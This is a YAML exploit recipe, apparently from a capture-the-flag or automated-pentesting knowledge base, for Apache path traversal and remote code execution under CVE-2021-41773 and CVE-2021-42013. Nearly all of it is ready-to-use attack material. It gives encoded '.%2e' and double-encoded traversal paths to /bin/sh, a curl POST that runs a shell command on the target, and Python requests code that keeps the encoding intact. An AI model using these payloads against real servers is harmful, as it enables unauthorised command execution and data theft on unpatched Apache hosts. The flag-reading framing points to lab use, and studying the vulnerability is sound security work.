name: apache_cve_2021_41773_path_traversal_rce
category: web
tags: [cve, apache, path_traversal, rce, cve-2021-41773]
indicators:
  - "Apache 2.4.49"
  - "CVE-2021-41773"

tricks:
  - name: "Step 1: Identify vulnerable version"
    when: "Apache 2.4.49"
    how: "Use .%2e to bypass path check for directory traversal"
    payload: |
      # .%2e decodes to .. for path traversal
      /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh

  - name: "Step 2: RCE via cgi-bin"
    when: "Execute command"
    how: "POST to /bin/sh, prefix command with echo; to separate CGI header"
    payload: |
      curl -X POST "http://TARGET/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
        -d "echo;cat /tmp/flag"

  - name: "Step 3: Extract the flag"
    when: "Use Python requests"
    how: "Manually set prepared.url to preserve URL encoding"
    payload: |
      session = requests.Session()
      req = requests.Request('POST', TARGET + path, data="echo;cat /tmp/flag")
      prepared = session.prepare_request(req)
      prepared.url = TARGET + "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
      response = session.send(prepared)

  - name: "Alternative: CVE-2021-42013 for Apache 2.4.50"
    when: "Apache 2.4.50"
    how: "Use double encoding .%%32%65"
    payload: |
      # 2.4.49: .%2e
      # 2.4.50: .%%32%65
      /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh

